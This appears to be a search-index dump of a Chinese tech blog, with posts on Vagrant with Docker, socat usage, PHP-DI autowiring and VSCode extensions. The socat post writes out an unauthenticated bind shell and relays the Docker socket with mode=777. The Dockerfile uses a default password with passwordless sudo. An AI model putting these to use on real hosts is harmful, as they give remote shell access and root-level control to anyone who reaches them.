小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"小結 我使用這個 playbook 不是非常完整 但他是我第一個網路上找到可以跑的 playbook 而且配置上還滿清楚的 比較多完整配置可以用DavidWittman/ansible-redis: Highly-configurable Ansible role to install Redis and Redis Sentinel from source ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:1:3","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"linux install 指令 install command in Linux with examples - GeeksforGeeks 簡單來說 可以複製檔案並且設定權限 這是我從 /etc/init/mysql.conf 看到 由於上面我花了一堆時間，這個就先跳過… ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:2:0","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"vagrant 搭配 docker 參考使用Vagrant跟Docker快速建構開發與測試環境 « Sam的程式筆記 執行結果 Bringing machine 'elasticsearch' up with 'docker' provider... Bringing machine 'postgres' up with 'docker' provider... ==\u003e elasticsearch: Pruning invalid NFS exports. Administrator privileges will be required... [sudo] password for malagege: ==\u003e elasticsearch: Creating the container... elasticsearch: Name: elasticsearch elasticsearch: Image: elasticsearch elasticsearch: Port: 9200:9200 elasticsearch: Port: 9300:9300 A Docker command executed by Vagrant didn't complete successfully! The command run along with the output from the command is shown below. Command: [\"docker\", \"run\", \"--name\", \"elasticsearch\", \"-d\", \"-p\", \"9200:9200\", \"-p\", \"9300:9300\", \"elasticsearch\", {:notify=\u003e[:stdout, :stderr]}] Stderr: Unable to find image 'elasticsearch:latest' locally /usr/bin/docker: Error response from daemon: manifest for elasticsearch:latest not found: manifest unknown: manifest unknown. See '/usr/bin/docker run --help'. 感覺電腦外層要裝 docker NFS 掛載你的 docker unix socket 到裡面開 docker container 他就只是在 docker 開啟 container… 不過這樣有什麼好處… 還在想 所以不能直接vagrant ssh 需要使用 vagrant docker-* 相關指令 drupal - Vagrant ssh to Docker container - Stack Overflow 當初以為這是在 VM 裝 docker，直接抓 image 開啟 container 但跟我想的不一樣 老實說這有什麼好處，我想可能用 docker-compose 會比較快吧… 但意外發現載入速度滿快的!!!(這不是廢話) ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:3:0","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"vagrant ssh 登入 container 參考: 如何配置 Vagrant SSH 在 Docker Provider - iWonder Blog 有找到如何使用 vagrant ssh 進去 dockerfile # Pull base image FROM ubuntu:16.04 # Installation RUN apt-get update RUN apt-get install -y openssh-server sudo # Create vagrant user with sudo privilege RUN useradd -m -d /home/vagrant -s /bin/bash vagrant RUN echo 'vagrant:vagrant' | chpasswd RUN echo 'vagrant ALL=(ALL) NOPASSWD:ALL' \u003e /etc/sudoers.d/vagrant RUN chmod 440 /etc/sudoers.d/vagrant # Run SSH service RUN mkdir /var/run/sshd EXPOSE 22 CMD [\"/usr/sbin/sshd\", \"-D\"] Vagrantfile # Vagrantfile # -*- mode: ruby -*- Vagrant.configure(\"2\") do |config| config.vm.provider \"docker\" do |d| d.build_dir = \".\" d.has_ssh = true end config.ssh.password = 'vagrant' end 或 Vagrantfile # Vagrantfile # -*- mode: ruby -*- Vagrant.configure(\"2\") do |config| config.vm.provider \"docker\" do |d| d.image = \"wonderchang/baseimage-ssh\" d.has_ssh = true end config.ssh.password = 'vagrant' config.vm.network \"forwarded_port\", guest: 80, host: 8080 config.vm.provision \"shell\", inline: \u003c\u003c-SHELL apt-get update apt-get install -y nginx service nginx start SHELL end vagrant up 就可以使用，vagrant ssh 就可以使用了 ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:3:1","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Vagrant"],"content":"相關 vagrant 連結 怎麼找到 \u0008Vagrant box 的 ssh 使用者與密碼 | Mr. 沙先生 Vagrant 學習筆記 - VagrantPi Blog Using default tag: latest Error response from daemon: manifest for elasticsearch:latest not found: manifest unknown: manifest unknown docker pull elasticsearch:6.5.0 Elasticsearch latest not available · Issue #215 · elastic/elasticsearch-docker 如何配置 Vagrant SSH 在 Docker Provider - iWonder Blog Ansible install and introduction | SAM的程式筆記 ","date":"2020-02-15","objectID":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/:3:2","tags":["vagrant","docker","ansible"],"title":"vagrant 搭配使用 ansible 和 docker 架設 redis 小記","uri":"/blog/posts/vagrant-%E6%90%AD%E9%85%8D%E4%BD%BF%E7%94%A8-ansible-%E5%92%8C-docker-%E6%9E%B6%E8%A8%AD-redis-%E5%B0%8F%E8%A8%98/"},{"categories":["Linux"],"content":"最近要看 unix socket 傳送資料而苦惱 剛好最近這個工具通过tcpdump对Unix Domain Socket 进行抓包解析 | plantegg 就是要你懂Unix Socket 进行抓包解析 | plantegg 馬上實作看看!!! ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:0:0","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"簡單介紹 Socket cat 是一個比 netcat(nc) 強大工具。 nc 我沒怎麼使用過，不過直接先跳學 socat 使用好像也不錯，感覺比 nc 簡單。 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:1:0","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"首先怎麼抓到 unix socket sudo mv /var/run/docker.sock /var/run/docker.sock.original sudo socat TCP-LISTEN:8089,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original sudo socat UNIX-LISTEN:/var/run/docker.sock,fork TCP-CONNECT:127.0.0.1:8089 以下是我想的流程，未必正確 上方實作 socket ，正常流程 socket server 會做 等待接收資料(stdin) client端: clinet socket (stdin) —\u003e server socket (對 client 來說是 stdout,server 來說是 stdin) Server接到完資料，經過程式處理，會回傳資料到client Server端: server socket (stdin) —\u003e client socket (對 server 來說是 stdout,client 來說是 stdin) 所以正常應該會有來回資料 用上面方法，我發現 docker 怎麼沒有 docker 容器跑出來結果docker run ubuntu echo hello 經過一番測試 sudo mv /var/run/docker.sock /var/run/docker.sock.original sudo socat -t100 -d -x -v UNIX-LISTEN:/var/run/docker.sock,mode=777,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original 用以上參數可以正常看到執行結果，又在想他有做轉發應該都會來回，應該可以做顯示 發現多了-t100 -d -x -v可以顯示結果 sudo mv /var/run/docker.sock /var/run/docker.sock.original sudo socat -t100 -d -x -v TCP-LISTEN:8089,reuseaddr,fork UNIX-CONNECT:/var/run/docker.sock.original sudo socat -t100 -d -x -v UNIX-LISTEN:/var/run/docker.sock,fork TCP-CONNECT:127.0.0.1:8089 這樣就正常了 -t\u003ctimeout\u003e 沒想到是跟這個有關係，設定-t100 就能顯示 When one channel has reached EOF, the write part of the other channel is shut down. Then, socat waits [timeval] seconds before terminating. Default is 0.5 seconds. This timeout only applies to addresses where write and read part can be closed independently. When during the timeout interval the read part gives EOF, socat terminates without awaiting the timeout. -v http 的話可服選擇這種方式去顯示記錄 -x 也是顯示封包格式 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:2:0","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"相關指令 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:0","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"讀寫文件 socat - /xxx/note.txt socat - ./note.txt 我一直搞不懂 - 意思 不過 第二個 address 是 STDOUT 突然就好懂了 不知道-是不是呼略的意思? 通常 socat [ option ] address1 address2 address1-\u003eaddress2 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:1","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"開 port 通訊 # command a window socat TCP-LISTEN:7000 - # command b window socat - TCP:127.0.0.1:7000 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:2","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":" 在服務端 7005 端口建立一個 Shell。 server $ socat TCP-LISTEN:7005,fork,reuseaddr EXEC:/bin/bash,pty,stderr 或者 $ socat TCP-LISTEN:7005,fork,reuseaddr system:bash,pty,stderr client # 連接到服務器的 7005 端口，即可獲得一個 Shell。readline 是 GNU 的命令行編輯器，具有歷史功能。 $ socat readline tcp:127.0.0.1:7005 我的ubuntu 不能用 readline 問題: ubuntu下，按照官方文檔，客戶端執行socat readline tcp:serverip:12345，出現錯誤提示：socat[2067] E unknown device/address “READLINE”，本機上已經安裝readline相關庫。 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:3","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"文件傳送 服務端 socat -u open:filename,binary tcp-listen:12345 客戶端 socat -u tcp:serverip:12345 open:localfilename,create,binary ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:4","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"讀寫分離 socat支持打開端的讀寫分離，使用!!符號，左側表示讀，右側表示寫。 socat open:hello.html!!open:log.txt,create,append tcp-listen:12345,reuseaddr,fork 說明 open:hello.html 表示讀hello.html文件。 open:log.txt 表示收到的數據寫入log.txt文件。 reuseaddr 見socket的SO_REUSEADDR。 fork 請求到達時，fork一個進程進行處理。 在bash下，需要用\\對!進行轉義。 參考:socat - szllq2000 - 博客园 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:5","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"通過 OPENSSL 加密傳送 參考: Socat 入門教程 - 運維之美 # 為服務端的證書取一個基本的名字。 FILENAME=server # 生成公鑰私鑰對。 openssl genrsa -out $FILENAME.key 1024 # 生成一個自簽名的證書，會提示你輸入國家代號、姓名等，或者按下回車鍵跳過輸入提示。 openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt # 用剛生成的密鑰文件和證書文件來生成PEM文件。 cat $FILENAME.key $FILENAME.crt \u003e$FILENAME.pem client FILENAME=client # 生成公鑰私鑰對。 openssl genrsa -out $FILENAME.key 1024 # 生成一個自簽名的證書，會提示你輸入國家代號、姓名等，或者按下回車鍵跳過輸入提示。 openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt # 用剛生成的密鑰文件和證書文件來生成PEM文件。 cat $FILENAME.key $FILENAME.crt \u003e$FILENAME.pem ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:6","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"憑證問題 如果出现异常 2016/12/15 17:49:50 socat[8259] E certificate is valid but its commonName does not match hostname 可使用 verify=0 关闭验证 或者添加 commonname 參考: 网络相关工具集 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:3:7","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"如何監聽 port 抓 GET POST 封包 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:4:0","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"Wireshark 0. 協定分析 : Wireshark | 宅學習 http.request.method == “POST” wireshark - Sniff HTTP packets for GET and POST requests from an application - Stack Overflow ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:4:1","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"tcpdump 過濾 GET 請求: sudo tcpdump host 3sd.me and port 80 and ’tcp[((tcp[12:1] \u0026 0xf0) » 2):4] = 0x47455420' 過濾 POST 請求： sudo tcpdump host 3sd.me and port 80 and ’tcp dst port 80 and (tcp[((tcp[12:1] \u0026 0xf0) » 2):4] = 0x504f5354)' 參考: 使用 wireshark 查看 tcpdump 的抓包結果 - Huang Huang 的博客 使用 tcpdump 抓取 POST 動作的 request 資料內容 | SSORC.tw ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:4:2","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"相關教學網站 用ssh和socat分分钟搞定Linux各种端口转发 - 知乎 TCPDump Capture HTTP GET/POST requests - Apache, Weblogic \u0026 Websphere SOCAT 简介 - BrieflyX’s Base Socat 入门教程 - 运维之美 socat - Cindy Sridharan - Medium socat使用笔记 - young525 - 博客园 socat | 夢想家 依云’s Blog tcpdump 抓包使用小结 | HelloDog ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:5:0","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"查詢到工具 cat、netcat、rinetd、stunnel FRP 推荐一款很好用的内网穿透工具–FRP 這篇算沒整理很好 很多網頁都整理不錯 大神們真的很厲害 我只能跪了 ","date":"2020-02-14","objectID":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/:5:1","tags":["linux","socat"],"title":"socat 實用網路工具 和 使用解析 unix socket 方法","uri":"/blog/posts/socat-%E5%AF%A6%E7%94%A8%E7%B6%B2%E8%B7%AF%E5%B7%A5%E5%85%B7-%E5%92%8C-%E4%BD%BF%E7%94%A8%E8%A7%A3%E6%9E%90-unix-socket-%E6%96%B9%E6%B3%95/"},{"categories":["PHP"],"content":"最近跑去看 PHP-DI 簡單實作小記 ","date":"2020-02-10","objectID":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:0:0","tags":["php","di"],"title":"PHP-DI 簡單自動注入小記","uri":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"簡單講解 在使用 Spring boot 和 Laravel 上，常常看到自動注入的範例 很多文章沒有深入講解為什麼可以做自動注入 這段時間我使用到 Spring boot 的 @autowired 做自動注入 明白在框架中有有一個機制在控制你裡面放的需要 new 出來的物件 在使用上可以說 最近再回頭看 php-di 就突然了解了 更多講解可以看Laravel 實作小記 | 程式狂想筆記 之前有記錄幾個網站有詳細談到 ","date":"2020-02-10","objectID":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:1:0","tags":["php","di"],"title":"PHP-DI 簡單自動注入小記","uri":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"自動注入 \u003c?php include './vendor/autoload.php'; # 第 1 步: 建立 DI container $builder = new \\DI\\ContainerBuilder(); $container = $builder-\u003ebuild(); # 第 2 步: 建立 class $a = $container-\u003eget('A'); var_dump($a); # 第 3 步: 建立 DI 實作 class，B class 不需要做 new 動作 class A{ private $_b; function __construct(B $b) { $this-\u003e_b = $b; // $b-\u003ehello(); } } class B{ function __construct() { echo \"Hello World! B\"; } function hello() { echo \"B:say hello\"; } } ","date":"2020-02-10","objectID":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:2:0","tags":["php","di"],"title":"PHP-DI 簡單自動注入小記","uri":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"autowiring 出來都是單例模式 \u003c?php include './vendor/autoload.php'; $builder = new \\DI\\ContainerBuilder(); $container = $builder-\u003ebuild(); $a = $container-\u003eget('A'); $a_b = $a-\u003eget_B(); $b = $container-\u003eget('B'); var_dump($a_b === $b); # true class A{ private $_b; function __construct(B $b) { $this-\u003e_b = $b; // $b-\u003ehello(); } function get_B() { return $this-\u003e_b; } } class B{ function __construct() { echo \"Hello World! B\"; } function hello() { echo \"B:say hello\"; } } BTW: Spring IOC 单例和多例 - 简书 hailindai/SSMSample ","date":"2020-02-10","objectID":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/:3:0","tags":["php","di"],"title":"PHP-DI 簡單自動注入小記","uri":"/blog/posts/PHP-DI-%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%A8%98/"},{"categories":["實用工具"],"content":"整理使用過 計畫會依照一年去做 UNIX: code –list-extensions | xargs -L 1 echo code –install-extension Windows (PowerShell, e. g. using VSCode’s integrated Terminal): code –list-extensions | % { “code –install-extension $_” } How can you export VS Code extension list - Stack Overflow Sublime 查詢 package list方法 preferences-\u003eBrowser Package ls 列出來 VScode 和 sublime 套件 ","date":"2020-02-09","objectID":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/:0:0","tags":["vscode","sublime"],"title":"VScode,Sublime 使用套件整理","uri":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/"},{"categories":["實用工具"],"content":"2020 ","date":"2020-02-09","objectID":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/:1:0","tags":["vscode","sublime"],"title":"VScode,Sublime 使用套件整理","uri":"/blog/posts/VScode-Sublime-%E4%BD%BF%E7%94%A8%E5%A5%97%E4%BB%B6%E6%95%B4%E7%90%86/"},{"categories":["實用工具"],"content":"VScode 公司 code –install-extension alexdima.copy-relative-path code –install-extension beaugust.blamer-vs code –install-extension bierner.emojisense code –install-extension bierner.markdown-checkbox code –install-extension bierner.markdown-emoji code –install-extension bierner.markdown-footnotes code –install-extension bierner.markdown-image-size code –install-extension bierner.markdown-preview-github-styles code –install-extension bmewburn.vscode-intelephense-client code –install-extension christian-kohler.path-intellisense code –install-extension dbaeumer.vscode-eslint code –install-extension donjayamanne.githistory code –install-extension DotJoshJohnson.xml code –install-extension dushaobindoudou.translation code –install-extension eamodio.gitlens code –install-extension EditorConfig.EditorConfig code –install-extension eg2.tslint code –install-extension espresso3389.unixtime-converter code –install-extension felixfbecker.php-intellisense code –install-extension formulahendry.auto-close-tag code –install-extension formulahendry.auto-rename-tag code –install-extension formulahendry.code-runner code –install-extension fskorzec.shadow-align code –install-extension GrapeCity.gc-excelviewer code –install-extension HackMD.vscode-hackmd code –install-extension huizhou.githd code –install-extension humao.rest-client code –install-extension imperez.smarty code –install-extension JakeWilson.vscode-cdnjs code –install-extension janjoerke.align-by-regex code –install-extension johnstoncode.svn-scm code –install-extension Kelvin.vscode-sshfs code –install-extension kokororin.vscode-phpfmt code –install-extension liximomo.sftp code –install-extension mhutchie.git-graph code –install-extension michelemelluso.gitignore code –install-extension mikestead.dotenv code –install-extension mkloubert.vscode-remote-workspace code –install-extension ms-azuretools.vscode-docker code –install-extension MS-CEINTL.vscode-language-pack-zh-hant code –install-extension ms-vscode.Go code –install-extension ms-vscode.sublime-keybindings code –install-extension mtxr.sqltools code –install-extension neilbrayfield.php-docblocker code –install-extension octref.vetur code –install-extension PKief.material-icon-theme code –install-extension quicktype.quicktype code –install-extension redhat.vscode-xml code –install-extension ryu1kn.partial-diff code –install-extension sadeghpm.sql-snippets code –install-extension shd101wyy.markdown-preview-enhanced code –install-extension shengchen.vscode-leetcode code –install-extension small.php-ci code –install-extension softwaredotcom.swdc-vscode code –install-extension streetsidesoftware.code-spell-checker code –install-extension 